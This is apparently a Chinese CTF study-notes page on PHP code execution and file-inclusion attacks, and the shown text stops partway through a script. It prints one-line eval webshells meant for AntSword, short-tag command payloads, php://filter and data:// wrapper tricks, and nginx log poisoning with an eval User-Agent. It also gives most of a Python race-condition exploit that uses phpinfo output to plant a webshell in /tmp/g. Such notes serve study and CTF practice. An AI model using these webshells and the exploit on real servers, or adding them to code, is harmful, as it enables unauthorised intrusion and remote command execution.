<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foobar</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">__FUNCTION__</span>, <span class="hljs-string">&quot; got <span class="hljs-subst">$arg</span> and <span class="hljs-subst">$arg2</span>\n&quot;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bar</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">__METHOD__</span>, <span class="hljs-string">&quot; got <span class="hljs-subst">$arg</span> and <span class="hljs-subst">$arg2</span>\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">// Call the foobar() function with 2 arguments</span><br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-string">&quot;foobar&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;one&quot;</span>, <span class="hljs-string">&quot;two&quot;</span>));<br><br><span class="hljs-comment">// Call the $foo-&gt;bar() method with 2 arguments</span><br><span class="hljs-variable">$foo</span> = <span class="hljs-keyword">new</span> foo;<br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$foo</span>, <span class="hljs-string">&quot;bar&quot;</span>), <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;three&quot;</span>, <span class="hljs-string">&quot;four&quot;</span>));<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<h4 id="eval-函数">eval()函数</h4>
<p>一句话木马：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//使用蚁剑连接，密码为参数名字`cmd`</span><br>    <br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//转接头，蚁剑连接url: xx/?cmd=eval($_POST[&#x27;1&#x27;])</span><br><span class="hljs-comment">//连接密码为1</span><br></code></pre></td></tr></table></figure>
<h4 id="call-user-fun-函数">call_user_fun()函数</h4>
<p>第一个参数为回调函数（注意eval、echo不属于函数）；</p>
<p>eval()可以替换为assert()，在<code>php5</code>中assert()是函数，且与eval()功能相同</p>
<h4 id="其他函数-查手册">其他函数-查手册</h4>
<p>array_walk_recursive()： 对数组中的每个成员递归地应用用户函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">bool</span> <span class="hljs-title function_ invoke__">array_walk_recursive</span>( <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$array</span>, <span class="hljs-keyword">callable</span> <span class="hljs-variable">$callback</span>)<br></code></pre></td></tr></table></figure>
<p>前面为参数，后面为函数。</p>
<p><strong>GET传参（数组）：</strong></p>
<p>例如：$_GET[‘a’]，传入[1,2,3]</p>
<p><code>url/?a[]=1&amp;a[]=2&amp;a[]=3</code></p>
<h4 id="过滤？但需要php标记">过滤？但需要php标记</h4>
<p>使用另一个php标记，这里<code>&lt;/script&gt;</code>表示一个<code>;</code>：（在php语法中，结束标记等于一个；）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;some editors (like FrontPage) don\&#x27;t</span><br><span class="hljs-string">              like processing instructions&#x27;</span>;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<h4 id="限制命令长度">限制命令长度</h4>
<ol>
<li>php标记压缩：<code>&lt;?= ?&gt;</code>  <code>&lt;?=  ;&gt;</code>  <code>&lt;?   ;</code></li>
<li>构造payload:</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>`<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]`&amp;<span class="hljs-number">1</span>=sleep3;<br></code></pre></td></tr></table></figure>
<ol start="3">
<li>该payload无回显，参考无回显的命令执行</li>
</ol>
<h4 id="蚁剑用法探索">蚁剑用法探索</h4>
<p>题目描述，过滤eval,request,include，phpinfo()表明配置中还禁止了一些系统执行函数</p>
<ol>
<li>替换为assert()函数，且使用base64编码</li>
<li>遇到虚拟终端无回显：插件<code>disable_function</code>多模式尝试</li>
</ol>
<ul>
<li>LD_PRELOAD：执行成功会生成xxproxy.php，通过访问该文件进行提权url/proxy.php/?1=，传参与第一步相同</li>
<li>若遇到权限不足，使用插件<code>搜索rwd目录及suid文件</code>，查找有sudo权限的命令</li>
</ul>
<h4 id="无字母数字的代码执行">无字母数字的代码执行</h4>
<p>利用异或，取反，自增，或等操作将非字母数字符号进行运算构造出字母或者数字（对应脚本）</p>
<h2 id="php文件包含">php文件包含</h2>
<h3 id="基础知识">基础知识</h3>
<p>include “路径”：包含并运行路径下的文件；如果文件内容包含php标记，会直接运行该php代码，如果没有，会直接按照文本输出</p>
<h4 id="php文件包含函数、语言结构">php文件包含函数、语言结构</h4>
<ul>
<li>include : 找不到文件时返回warning，可继续运行</li>
<li>require：找不到文件返回fatal(致命错误)，不能继续运行</li>
<li>include_once：包含一次</li>
<li>require_once：成功包含一次</li>
</ul>
<h4 id="include-和-eval的区别">include 和 eval的区别</h4>
<ul>
<li>include后跟路径</li>
<li>eval后直接跟php代码</li>
</ul>
<h4 id="文件包含漏洞">文件包含漏洞</h4>
<p>文件包含的内容用户可控，相当于任意位置文件读取（本身可回显）</p>
<h3 id="php伪协议-“路径”">php伪协议(“路径”)</h3>
<h4 id="基础知识-2">基础知识</h4>
<p>协议：通信双方的一些约定；</p>
<p>应用层协议：</p>
<ul>
<li>gopher协议：主要用于在网络上组织和检索信息，尤其是在文本和文档的共享方面</li>
<li>qq拉起协议：一些页面需要qq登录时，根据协议自动拉取本地qq程序</li>
</ul>
<h4 id="php伪协议">php伪协议</h4>
<p>格式：<code>协议名://</code>，无协议名时，默认file://协议</p>
<h5 id="file">file://</h5>
<p>使用：<code>inclue file://路径</code>，这里路径表示文件所在位置，可使用相对路径或者绝对路径；</p>
<p>php下路径的两个特性：</p>
<ul>
<li>上层目录特性：所有目录均存在上层目录，根目录的上层目录仍是根目录</li>
<li>目录整理特性：自动整理<code>../</code></li>
</ul>
<p>可使用<code>../../../</code>进行目录穿越。</p>
<h5 id="http">http://</h5>
<p>构成url路径；</p>
<p>使用：</p>
<ul>
<li>include “url”  ：(需要去pip.ini开启url_include)</li>
<li>file_get_content(“路径”) :路径可以是本地路径（本地文件），也可以是url路径（远程主机文件）</li>
</ul>
<h5 id="ftp">ftp://</h5>
<p>默认21端口，读取远程服务器文件;</p>
<p>使用：<code>include ftp://xx/xx</code></p>
<h5 id="php-input">php://input</h5>
<p>可以看成是一个路径，<strong>指向POST提交数据处</strong>；可以读取POST请求提交的原始数据，且可以不用key-value格式（虽然hackbar会自动过滤该请求）</p>
<p>使用：<code>include php://input</code>，可输出php代码进行利用（需要有php标记才会执行）</p>
<h5 id="php-filter">php://filter</h5>
<p>也可以看成是一个路径，不过其包含过滤器，可以对路径下的文件内容进行处理</p>
<p>使用：<code>file_put_contents($filenema,$content)</code>，filename可以使用<code>php://filter</code></p>
<p>​			也可用于直接读取当前目录下文件。</p>
<p>作用：</p>
<ul>
<li>过滤绕过：base64编码后解码</li>
</ul>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">write</span>=<span class="hljs-built_in">convert</span>.base64-decode/resource=<span class="hljs-number">1.</span>php<br></code></pre></td></tr></table></figure>
<ul>
<li>代码绕过：rot13编码（凯撒密码13位，使用两次相当于还原）</li>
</ul>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">write</span>=<span class="hljs-keyword">string</span>.rot13/resource=<span class="hljs-number">1.</span>php<br></code></pre></td></tr></table></figure>
<p>可以使用|从而使用多个过滤器，其余过滤器可查看PHP手册</p>
<h5 id="data">data://</h5>
<p>也可以看成一个路径，但该路径直接包含内容</p>
<p>例如：</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">url/?cmd=data://text/plain/,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">其中//text/plain/可以省略</span><br></code></pre></td></tr></table></figure>
<h3 id="php的强制文件上传机制">php的强制文件上传机制</h3>
<p>可以给一个php文件强制上传一个本地文件，该本地文件会临时存放在/tmp/phpxxxxxx，在$_FILES全局变量中会存储相关信息,最后一位有1/3的概率是大写字母（使用[ @-[ ]]）进行匹配，该临时文件的生命周期是原php文件的执行周期，原php文件执行完毕后改临时文件会被删除。</p>
<p>文件上传表单：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;uploads&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>抓包，并通过本地强制文件上传路径传递GET参数（存储在超全局变量$_GET中），使用<code>.</code>执行本地文件，后接的空格可以使用<code>+</code>代替。</p>
<h3 id="小总结">小总结</h3>
<ol>
<li>文件名可控</li>
</ol>
<p>include $file.“php”  ： 使用data协议，php标签闭合后面的<code>.php</code></p>
<ol start="2">
<li>文件后缀可控</li>
</ol>
<p>include “/var/www/html”.$file ：这种情况下大多数伪协议无法使用，可以使用目录穿越。</p>
<h3 id="nginx日志文件包含">nginx日志文件包含</h3>
<h4 id="nginx原理">nginx原理</h4>
<p>nginx是一个服务器软件，提供http服务，默认监听80端口；</p>
<p>例如访问<code>http://localhost/123.php?a=b</code>时，nginx会先检查文件后缀是否为php后缀，</p>
<p>若是，nginx会进行转发，转发到本地9000端口，由php-fpm（中间件）监听，提供解析php文件并执行里面的php代码的服务，并将结果返回给nginx，再由nginx返回给浏览器；</p>
<p>若不是，则由nginx自己处理，找到Web目录，读取内容返回给浏览器，并告诉浏览器相应的格式。</p>
<h4 id="nginx日志文件利用">nginx日志文件利用</h4>
<p>将每条操作记录存储在<code>access.log</code>文件中，可以通过控制<code>User-Agent</code>字段（原封不动地存储）的内容来实现代码执行。</p>
<p>注意：<br>
Linux下默认的日志路径为<code>/var/log/nginx/access.log</code>；</p>
<p>写<code>User-Agent</code>时需要一次写对，否则会污染环境。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">User-Agent:<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-title function_ invoke__">phpinfo</span>();  <span class="hljs-comment">//phpinfo()用于定位</span><br></code></pre></td></tr></table></figure>
<p>能利用的前提是：</p>
<p>有文件名完全可控的包含点（含有后缀不能利用）；</p>
<p>默认nginx日志的路径不变。</p>
<h3 id="临时文件包含">临时文件包含</h3>
<p>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201136">https://www.anquanke.com/post/id/201136</a></p>
<h4 id="原理">原理</h4>
<p>前提知识点：参考php强制文件上传机制</p>
<p>在文件包含中，include “/???/???[@-[]”是错误，路径不能含有通配符</p>
<p>所以，想要利用该文件，必须得到文件全称。</p>
<p><strong>知识点：</strong></p>
<ol>
<li>php每次向浏览器返回数据时，会以块(4096个字符)为单位，当超过4096个字符后，会一块一块地返回。</li>
<li>强制文件上传的相关信息（包括文件名）会存储在全局变量$_FILES中的‘tmp_name’，可在phpinfo()中查看</li>
</ol>
<h4 id="phpinfo-lfi利用">phpinfo_lfi利用</h4>
<p>存在问题：</p>
<p>文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p>
<p>利用原理：<br>
向phpinfo()页面强制上传本地文件（包含恶意代码），增加phpinfo()的长度，拖慢执行过程，在该过程中读取$_FILES中的‘tmp_name’获取上传的文件路径，进行文件包含即可。</p>
<p>利用过程：</p>
<p>（1）发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</p>
<p>（2）因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</p>
<p>（3）php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</p>
<p>（4）所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</p>
<p>（5）此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</p>
<p>（6）利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</p>
<p>利用代码：（python2版本）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python </span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setup</span>(<span class="hljs-params">host, port</span>):<br>    TAG=<span class="hljs-string">&quot;Security Test&quot;</span><br>    PAYLOAD=<span class="hljs-string">&quot;&quot;&quot;%s\r</span><br><span class="hljs-string">&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?=eval($_REQUEST[1])?&gt;&#x27;)?&gt;\r&quot;&quot;&quot;</span> % TAG<br>    REQ1_DATA=<span class="hljs-string">&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span><br><span class="hljs-string">Content-Type: text/plain\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">%s</span><br><span class="hljs-string">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot;</span> % PAYLOAD<br>    padding=<span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">5000</span><br><span class="hljs-comment">###REQ1包含强制上传文件的内容及大量的垃圾数据</span><br>    REQ1=<span class="hljs-string">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot; HTTP/1.1\r</span><br><span class="hljs-string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_USER_AGENT: &quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_PRAGMA: &quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span><br><span class="hljs-string">Content-Length: %s\r</span><br><span class="hljs-string">Host: %s\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">%s&quot;&quot;&quot;</span> %(<span class="hljs-built_in">len</span>(REQ1_DATA),host,REQ1_DATA)<br>    <span class="hljs-comment">#modify this to suit the LFI script </span><br><span class="hljs-comment">###进行include文件包含利用</span><br>    LFIREQ=<span class="hljs-string">&quot;&quot;&quot;GET /?file=%s HTTP/1.1\r</span><br><span class="hljs-string">User-Agent: Mozilla/4.0\r</span><br><span class="hljs-string">Proxy-Connection: Keep-Alive\r</span><br><span class="hljs-string">Host: %s\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> (REQ1, TAG, LFIREQ)<br><br><span class="hljs-comment">###核心利用代码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">phpInfoLFI</span>(<span class="hljs-params">host, port, phpinforeq, offset, lfireq, tag</span>):<br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    <br><br>    s.connect((host, port))<br>    s2.connect((host, port))<br><br>    <span class="hljs-comment">#强制文件上传</span><br>    s.send(phpinforeq)<br>    d = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(d) &lt; offset:<br>        d += s.recv(offset)<br>    <span class="hljs-keyword">try</span>:<br>        i = d.index(<span class="hljs-string">&quot;[tmp_name] =&amp;gt; &quot;</span>)<br>        fn = d[i+<span class="hljs-number">17</span>:i+<span class="hljs-number">31</span>]<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment">###文件包含利用</span><br>    s2.send(lfireq % (fn, host))<br>    d = s2.recv(<span class="hljs-number">4096</span>)<br>    s.close()<br>    s2.close()<br><br>    <span class="hljs-keyword">if</span> d.find(tag) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> fn<br><br>counter=<span class="hljs-number">0</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadWorker</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, e, l, m, *args</span>):<br>        threading.Thread.__init__(<span class="hljs-variable language_">self</span>)<br>        <span class="hljs-variable language_">self</span>.event = e<br>        <span class="hljs-variable language_">self</span>.lock =  l<br>        <span class="hljs-variable language_">self</span>.maxattempts = m<br>        <span class="hljs-variable language_">self</span>.args = args<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">global</span> counter<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.event.is_set():<br>            <span class="hljs-keyword">with</span> <span class="hljs-variable language_">self</span>.lock:<br>                <span class="hljs-keyword">if</span> counter &gt;= <span class="hljs-variable language_">self</span>.maxattempts:<br>                    <span class="hljs-keyword">return</span><br>                counter+=<span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">try</span>:<br>                x = phpInfoLFI(*<span class="hljs-variable language_">self</span>.args)<br>                <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.event.is_set():<br>                    <span class="hljs-keyword">break</span>                <br>                <span class="hljs-keyword">if</span> x:<br>                    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nGot it! Shell created in /tmp/g&quot;</span><br>                    <span class="hljs-variable language_">self</span>.event.<span class="hljs-built_in">set</span>()<br>                    <br>            <span class="hljs-keyword">except</span> socket.error:<br>                <span class="hljs-keyword">return</span><br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getOffset</span>(<span class="hljs-params">host, port, phpinforeq</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span><br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.connect((host,port))<br>    s.send(phpinforeq)<br>    <br>    d = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = s.recv(<span class="hljs-number">4096</span>)<br>        d+=i        <br>        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;&quot;</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># detect the final chunk</span><br>        <span class="hljs-keyword">if</span> i.endswith(<span class="hljs-string">&quot;0\r\n\r\n&quot;</span>):<br>            <span class="hljs-keyword">break</span><br>    s.close()<br>    i = d.find(<span class="hljs-string">&quot;[tmp_name] =&amp;gt; &quot;</span>)<br>    <span class="hljs-keyword">if</span> i == -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;No php tmp_name in phpinfo output&quot;</span>)<br>    <br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;found %s at %i&quot;</span> % (d[i:i+<span class="hljs-number">10</span>],i)<br>    <span class="hljs-comment"># padded up a bit</span><br>    <span class="hljs-keyword">return</span> i+<span class="hljs-number">256</span>     <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;LFI With PHPInfo()&quot;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;-=&quot;</span> * <span class="hljs-number">30</span><br><br>    <span class="hljs-comment">###一些参数检查</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="hljs-number">0</span>]<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        host = socket.gethostbyname(sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">except</span> socket.error, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="hljs-number">1</span>], e)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    port=<span class="hljs-number">80</span><br>    <span class="hljs-keyword">try</span>:<br>        port = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">except</span> IndexError:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">except</span> ValueError, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="hljs-number">2</span>], e)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    <br>    poolsz=<span class="hljs-number">10</span><br>    <span class="hljs-keyword">try</span>:<br>        poolsz = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">3</span>])<br>    <span 